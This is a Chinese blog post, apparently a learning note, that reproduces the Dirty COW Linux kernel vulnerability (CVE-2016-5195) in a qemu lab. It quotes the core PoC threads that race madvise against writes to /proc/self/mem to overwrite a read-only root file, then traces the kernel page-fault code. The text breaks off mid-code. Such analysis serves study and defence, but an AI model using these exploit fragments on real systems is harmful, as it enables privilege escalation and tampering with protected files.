

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/hope.jpg">
  <link rel="icon" href="/img/hope.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="hope">
  <meta name="keywords" content="">
  
    <meta name="description" content="CVE-2016-5195复现">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2016-5195-Dirtycow">
<meta property="og:url" content="http://example.com/2023/06/27/CVE-2016-5195-DirtyCow/index.html">
<meta property="og:site_name" content="hope">
<meta property="og:description" content="CVE-2016-5195复现">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://github.com/h0pe-ay/picgo/raw/master/image-20230101163821643.png">
<meta property="og:image" content="https://github.com/h0pe-ay/picgo/raw/master/image-20230101165753546.png">
<meta property="og:image" content="https://github.com/h0pe-ay/picgo/raw/master/image-20230101170006311.png">
<meta property="og:image" content="https://github.com/h0pe-ay/picgo/raw/master/image-20230101170224478.png">
<meta property="og:image" content="https://github.com/h0pe-ay/picgo/raw/master/image-20230101170539003.png">
<meta property="og:image" content="https://github.com/h0pe-ay/picgo/raw/master/image-20230101171200414.png">
<meta property="og:image" content="https://github.com/h0pe-ay/picgo/raw/master/image-20230101172732897.png">
<meta property="og:image" content="https://github.com/h0pe-ay/picgo/raw/master/image-20230101173158606.png">
<meta property="og:image" content="https://github.com/h0pe-ay/picgo/raw/master/image-20230101173443506.png">
<meta property="og:image" content="https://github.com/h0pe-ay/picgo/raw/master/image-20230101173521394.png">
<meta property="og:image" content="https://github.com/h0pe-ay/picgo/raw/master/image-20230101173811280.png">
<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202306091155834.png">
<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202306091155369.png">
<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202306091150792.png">
<meta property="og:image" content="https://github.com/h0pe-ay/picgo/raw/master/image-20230101175601751.png">
<meta property="article:published_time" content="2023-06-27T11:03:46.716Z">
<meta property="article:modified_time" content="2023-06-27T11:06:54.473Z">
<meta property="article:author" content="hope">
<meta property="article:tag" content="CVE-2016-5195">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://github.com/h0pe-ay/picgo/raw/master/image-20230101163821643.png">
  
  
  
  <title>CVE-2016-5195-Dirtycow - hope</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"ZqEEnP8vrF2LzEKjCt8pL5Cf-gzGzoHsz","app_key":"6Owvec9nVB4K93xxi7CKzAqh","server_url":"https://zqeenp8v.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>hope</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CVE-2016-5195-Dirtycow"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-06-27 19:03" pubdate>
          2023年6月27日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          36k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          301 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">CVE-2016-5195-Dirtycow</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直想学习Linux内核的相关知识却没有动身，偶然间在看雪发现了一篇复现脏牛的帖子<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-266033.htm">linux內核提权漏洞CVE-2016-5195</a>，写的非常详细，并且一直听说过脏牛提权的漏洞，借此机会跟着复现并且好好深入学习一下内核相关知识，恶补一下我这不扎实的基础，由于此前没怎么接触过内核相关知识及代码，因此做一个详细的笔记，方便以后查阅。</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>环境采用qemu+busybox+linux-4.4.1主要参考两篇文章<a target="_blank" rel="noopener" href="https://yuanbaoder.gitee.io/posts/2432.html#more">搭建Linux kernel调试环境</a>以及<a target="_blank" rel="noopener" href="https://www.v4ler1an.com/2020/12/qemu/">QEMU + Busybox 模拟 Linux 内核环境</a></p>
<p>这两篇文章关于如何搭建环境已经解释的很详细了，我这里就不在阐述。</p>
<p>主要是记录一下搭建环境时候遇到的问题</p>
<ul>
<li>想要执行DirtyCow的exp，编译busybox后，需要挂载相应的文件系统，否则exp会执行不了，这里可以用一下ctf kernel题目的文件系统。</li>
<li>使用qemu启动时可以选择把cpu的个数设置为1，方便调试，否则会调试到一半跳转到其他进程<code>-smp cores=1,threads=1</code></li>
<li>关于linux内核编译时的优化，由于编译时的优化使得调试时不太方便，代码也会跳来跳去，因此需要将优化给关闭，但是直接修改Makefile文件将-O2修改为-O0，编译时会报错，因为内核的部分代码依赖于编译器的优化，这里找到了解决办法<a target="_blank" rel="noopener" href="https://lists.kernelnewbies.org/pipermail/kernelnewbies/2016-March/015985.html">Is it possible to turn off the gcc optimization when compiling kernel?</a>，我们可以找到需要调试的模块，并修改该模块下的<code>Makefile</code>，例如将内核中read_write函数的优化关闭，可以在Makefile文件下添加<code>CFLAGS_read_write.o = -O0</code>，再编译即可或在函数前加<code>__attribute__((optimize(&quot;O0&quot;)))</code></li>
</ul>
<h1 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h1><ul>
<li><code>ubuntu 16.04</code></li>
<li><code>Linux-4.4.1</code></li>
<li><code>qemu-system-x86_64 2.5.0</code></li>
</ul>
<h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><p>文件<code>foo</code>是<code>root</code>权限的只读文件，但是利用脏牛漏洞，可以将数据<code>1111</code>写入到只读文件中</p>
<p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101163821643.png" srcset="/img/loading.gif" lazyload alt="image-20230101163821643"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>以<code>poc</code>作为切入点，分析漏洞成因</p>
<p>首先<code>poc</code>定义了两个线程以及这两个线程需要执行的操作，其中一个线程操作如<code>madviseThread</code>，不断执行<code>madvise</code>函数，该函数的参数<code>MADV_DONTNEED</code>旨在通知内核，<code>map</code>指定的地址内存短时间内不再访问，因此该线程做的具体操作就是不断的丢弃<code>map</code>地址指向的内存页。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">madviseThread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>  <span class="hljs-type">char</span> *str;<br>  str=(<span class="hljs-type">char</span>*)arg;<br>  <span class="hljs-type">int</span> i,c=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100000000</span>;i++)<br>  &#123;<br>    c+=madvise(<span class="hljs-built_in">map</span>,<span class="hljs-number">100</span>,MADV_DONTNEED);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;madvise %d\n\n&quot;</span>,c);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>另一个线程的操作是<code>procselfmemThread</code>，该函数会访问内存空间，并找到<code>map</code>地址指向的内存，并且不断地写入数据。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">procselfmemThread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>  <span class="hljs-type">char</span> *str;<br>  str=(<span class="hljs-type">char</span>*)arg;<br><br>  <span class="hljs-type">int</span> f=open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>,O_RDWR);<br>  <span class="hljs-type">int</span> i,c=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100000000</span>;i++) &#123;<br>    lseek(f,(<span class="hljs-type">uintptr_t</span>) <span class="hljs-built_in">map</span>,SEEK_SET);<br>    c+=write(f,str,<span class="hljs-built_in">strlen</span>(str));<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;procselfmem %d\n\n&quot;</span>, c);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>最后就是<code>poc</code>需要指定一个需要写入的只读文件，<code>poc</code>首先以只读权限打开目标文件，接着利用<code>mmap</code>函数将文件映射到进程空间中去，接着结合上述两个线程的操作，一个线程不断丢弃<code>map</code>指向的内存页，而另一个线程则不断地向<code>map</code>地址指向地内存页写入输入，那么在某一时刻发生了条件竞争则会导致往只读文件写入恶意数据。完成对只读文件写入的操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br>  f=open(argv[<span class="hljs-number">1</span>],O_RDONLY);<br>  fstat(f,&amp;st);<br>  name=argv[<span class="hljs-number">1</span>];<br>  <span class="hljs-built_in">map</span>=mmap(<span class="hljs-literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;mmap %zx\n\n&quot;</span>,(<span class="hljs-type">uintptr_t</span>) <span class="hljs-built_in">map</span>);<br>...<br></code></pre></td></tr></table></figure>

<p>在使用<code>mmap</code>函数将文件映射到内存的时，并没有完成虚拟地址向物理地址映射的过程，当对该地址进行写入操作时会触发缺页异常。整个缺页处理的流程是通过内核函数<code>follow_page_mask</code>与<code>faultin_page</code>函数处理完成的，具体流程如下</p>
<p>（1）第一次进入<code>follow_page_mask</code>，由于没有建立物理页，因此会直接通过<code>no_page_table</code>函数返回</p>
<p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101165753546.png" srcset="/img/loading.gif" lazyload alt="image-20230101165753546"></p>
<p>（2）由于没有找到对应的页表，则进入缺页错误处理函数中，进行物理页的建立</p>
<p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101170006311.png" srcset="/img/loading.gif" lazyload alt="image-20230101170006311"></p>
<p>（3）进入<code>faultin_page</code>函数进行缺页处理，由于需要对该内存页进行写操作（<code>procselfmemThread</code>线程执行的操作）,因此需要将<code>FAULT_FLAG_WRITE</code>标志位标记上，因为进程在映射文件的时候是只读映射，但是需要对这块内存进行写入操作，因此内核会用<code>FAULT_FLAG_WRITE</code>进行标记，这个标志位就是导致漏洞发生的关键点。</p>
<p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101170224478.png" srcset="/img/loading.gif" lazyload alt="image-20230101170224478"></p>
<p>（3）接着会进入<code>handle_mm_fault</code>函数，这个函数就会内存对应的物理页生成好，返回给用户进行写入操作。</p>
<p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101170539003.png" srcset="/img/loading.gif" lazyload alt="image-20230101170539003"></p>
<p>（4）这里介绍一下在<code>handle_mm_falut</code>函数内部会遇到三个函数的选择，分别是<code>do_read_fault</code>、<code>do_cow_fault</code>以及 <code>do_shared_fault</code>函数，由于<code>poc</code>使用<code>mmap</code>映射文件到内存的时候并有没有选择共享模式进行映射，因此不会进入<code>do_shared_fault</code>函数内部的流程，那么<code>do_read_fault</code>与<code>do_cow_fault</code>函数会怎么选择呢？这里涉及写时复制的操作，若进程对该内存只有读操作，那么内核会直接将内存对应的物理页返回给进程进行读操作，而进程对该内存需要进行写操作时候，由于不能影响原先物理内存的信息，此时内核会选择将该内存对应的物理页进行拷贝操作得到一个物理页的副本，将这个副本交给进程，那么进程就可以随意改写并且不会影响原始物理页的信息。那么如何判断进程是否有写的意图，从代码上可以看到，取决于<code>FAULT_FLAG_WRITE</code>这个标志位。</p>
<p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101171200414.png" srcset="/img/loading.gif" lazyload alt="image-20230101171200414"></p>
<p>（5）那么继续回到<code>handle_mm_fault</code>函数，这个函数就是经过一系列操作返回一个供进程写的物理页，但是返回的物理页不具有写的权限，因此会直接返回0。</p>
<p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101172732897.png" srcset="/img/loading.gif" lazyload alt="image-20230101172732897"></p>
<p>（6）则会第二次进入<code>follow_page_mask</code>函数，由于进程需要内存也也进行写操作，但是返回的内存页不能写，那么需要再一次进入<code>faultin_page</code>函数进行处理</p>
<p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101173158606.png" srcset="/img/loading.gif" lazyload alt="image-20230101173158606"></p>
<p>（7）第二次<code>faultin_page</code>函数后，<code>handle_mm_fault</code>函数则会返回一个可写的物理页</p>
<p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101173443506.png" srcset="/img/loading.gif" lazyload alt="image-20230101173443506"></p>
<p>（8）由于已经返回了可写的物理页，那么<code>FOLL_WRITE</code>标志位就可以清空了，这里是漏洞利用条件竞争想发生的时间点</p>
<p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101173521394.png" srcset="/img/loading.gif" lazyload alt="image-20230101173521394"></p>
<p>（9）第三次进入<code>follow_page_mask</code>函数，可以发现此时终于获得了物理页地址</p>
<p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101173811280.png" srcset="/img/loading.gif" lazyload alt="image-20230101173811280"></p>
<p>这里总结一些缺页流程，需要经过三次<code>follow_page_mask</code>函数以及两次<code>faultin_page</code>函数</p>
<ul>
<li><p><strong>第一次</strong><code>follow_page_mask</code>由于没有找到内存对应的物理页因此无法获取，则需要进入<code>faultin_page</code>函数进行缺页处理</p>
</li>
<li><p><strong>第一次</strong><code>faultin_page</code>函数建立了内存页对应的物理页，但是该物理页不具有可写权限。</p>
</li>
<li><p><strong>第二次</strong><code>follow_page_mask</code>，由于物理页不可写，直接返回。</p>
</li>
<li><p><strong>第二次</strong><code>faultin_page</code>，返回可写的物理页，将<code>FOLL_WRITE</code>标志位清除</p>
</li>
<li><p><strong>第三次</strong><code>follow_page_mask</code>，获得了可写的物理页，继续进行后续操作。</p>
</li>
</ul>
<p><strong>漏洞点</strong></p>
<p>在进行<strong>第二次</strong><code>faultin_page</code>时，<code>FOLL_WRITE</code>标志位被清除，<code>madviseThread</code>线程操作刚好执行，那么会将建立好的映射清空，那么流程进入到<code>follow_page_mask</code>会发现没法获取对应的物理页，则会继续进入<code>faultin_page</code>函数进行缺页处理，但是此时已经没有<code>FOLL_WRITE</code>标志位了，那么内核就会认为进程不会对该内存空间进行写操作，那么就会进入<code>do_read_fault</code>函数的流程，会将只读文件对应的物理页直接返回，那么后续的改写操作都会在这个物理页进行操作，从而导致只读文件被改写。</p>
<h1 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h1><ul>
<li><code>sys_write</code>函数本质是调用了内核的<code>SYSCALL_DEFINE3(write,unsigned int,fd,const char __user *,buf,size_t,count)</code></li>
</ul>
<p><strong>linux-4.4.1&#x2F;include&#x2F;linux&#x2F;syscalls.h:182</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_FTRACE_SYSCALLS</span><br>...<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_METADATA(sname, nb, ...)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_DEFINE0(sname)					\ <span class="hljs-comment">//没有参数的系统调用</span></span><br>	SYSCALL_METADATA(_#<span class="hljs-meta">#sname, 0);				\</span><br><span class="hljs-meta">	asmlinkage long sys_##sname(void)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_DEFINE1(name, ...) SYSCALL_DEFINEx(1, _##name, __VA_ARGS__) <span class="hljs-comment">//一个参数的系统调用</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_DEFINE2(name, ...) SYSCALL_DEFINEx(2, _##name, __VA_ARGS__) <span class="hljs-comment">//两个参数的系统调用</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_DEFINE3(name, ...) SYSCALL_DEFINEx(3, _##name, __VA_ARGS__) <span class="hljs-comment">//三个参数的系统调用</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_DEFINE4(name, ...) SYSCALL_DEFINEx(4, _##name, __VA_ARGS__) <span class="hljs-comment">//四个参数的系统调用</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_DEFINE5(name, ...) SYSCALL_DEFINEx(5, _##name, __VA_ARGS__) <span class="hljs-comment">//五个参数的系统调用</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_DEFINE6(name, ...) SYSCALL_DEFINEx(6, _##name, __VA_ARGS__) <span class="hljs-comment">//六个参数的系统调用</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_DEFINEx(x, sname, ...)				\</span><br><span class="hljs-meta">	SYSCALL_METADATA(sname, x, __VA_ARGS__)			\ <span class="hljs-comment">//当没有定义CONFIG_FTRACE_SYSCALLS时，SYSCALL_METADATA(sname, x, __VA_ARGS__)的宏定义为空值</span></span><br>	__SYSCALL_DEFINEx(x, sname, __VA_ARGS__)  <span class="hljs-comment">//将...以__VA_ARGS__替换</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __PROTECT(...) asmlinkage_protect(__VA_ARGS__) <span class="hljs-comment">// asmlinkage_protect(__VA_ARGS__)的宏定义为 do&#123; &#125;while(0)</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __SYSCALL_DEFINEx(x, name, ...)					\</span><br><span class="hljs-meta">	asmlinkage long sys##name(__MAP(x,__SC_DECL,__VA_ARGS__))	\</span><br><span class="hljs-meta">		__attribute__((alias(__stringify(SyS##name))));		\ <span class="hljs-comment">//设置别名,sys_write等同于SyS_write</span></span><br>	<span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">long</span> SYSC#<span class="hljs-meta">#name(__MAP(x,__SC_DECL,__VA_ARGS__));	\ <span class="hljs-comment">//_MAP()则是将参数拼接起来</span></span><br>	asmlinkage <span class="hljs-type">long</span> SyS#<span class="hljs-meta">#name(__MAP(x,__SC_LONG,__VA_ARGS__));	\</span><br><span class="hljs-meta">	asmlinkage long SyS##name(__MAP(x,__SC_LONG,__VA_ARGS__))	\ <span class="hljs-comment">//Sys_write内部调用了SYSC_write</span></span><br>	&#123;								\<br>		<span class="hljs-type">long</span> ret = SYSC#<span class="hljs-meta">#name(__MAP(x,__SC_CAST,__VA_ARGS__));	\</span><br><span class="hljs-meta">		__MAP(x,__SC_TEST,__VA_ARGS__);				\</span><br><span class="hljs-meta">		__PROTECT(x, ret,__MAP(x,__SC_ARGS,__VA_ARGS__));	\</span><br><span class="hljs-meta">		return ret;						\</span><br><span class="hljs-meta">	&#125;								\</span><br><span class="hljs-meta">	static inline long SYSC##name(__MAP(x,__SC_DECL,__VA_ARGS__))</span><br></code></pre></td></tr></table></figure>

<p><strong>linux-4.4.1&#x2F;include&#x2F;linux&#x2F;syscalls.h:92</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MAP0(m,...)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MAP1(m,t,a) m(t,a)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MAP2(m,t,a,...) m(t,a), __MAP1(m,__VA_ARGS__)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MAP3(m,t,a,...) m(t,a), __MAP2(m,__VA_ARGS__)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MAP4(m,t,a,...) m(t,a), __MAP3(m,__VA_ARGS__)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MAP5(m,t,a,...) m(t,a), __MAP4(m,__VA_ARGS__)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MAP6(m,t,a,...) m(t,a), __MAP5(m,__VA_ARGS__)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MAP(n,...) __MAP##n(__VA_ARGS__) <span class="hljs-comment">//n代表参数的个数</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __SC_DECL(t, a)	t a <span class="hljs-comment">//将两个参数直接拼接起来，即t为类型，a为变量名，例如__SE_DECL(int,x) = int x</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __TYPE_IS_L(t)	(__same_type((t)0, 0L))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __TYPE_IS_UL(t)	(__same_type((t)0, 0UL))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __TYPE_IS_LL(t) (__same_type((t)0, 0LL) || __same_type((t)0, 0ULL))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __SC_LONG(t, a) __typeof(__builtin_choose_expr(__TYPE_IS_LL(t), 0LL, 0L)) a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __SC_CAST(t, a)	(t) a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __SC_ARGS(t, a)	a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __SC_TEST(t, a) (void)BUILD_BUG_ON_ZERO(!__TYPE_IS_LL(t) &amp;&amp; sizeof(t) &gt; sizeof(long))</span><br></code></pre></td></tr></table></figure>

<p><strong>linux-4.4.1&#x2F;include&#x2F;linux&#x2F;stringify.h</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __LINUX_STRINGIFY_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LINUX_STRINGIFY_H</span><br><br><span class="hljs-comment">/* Indirect stringification.  Doing two levels allows the parameter to be a</span><br><span class="hljs-comment"> * macro itself.  For example, compile with -DFOO=bar, __stringify(FOO)</span><br><span class="hljs-comment"> * converts to &quot;bar&quot;.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __stringify_1(x...)	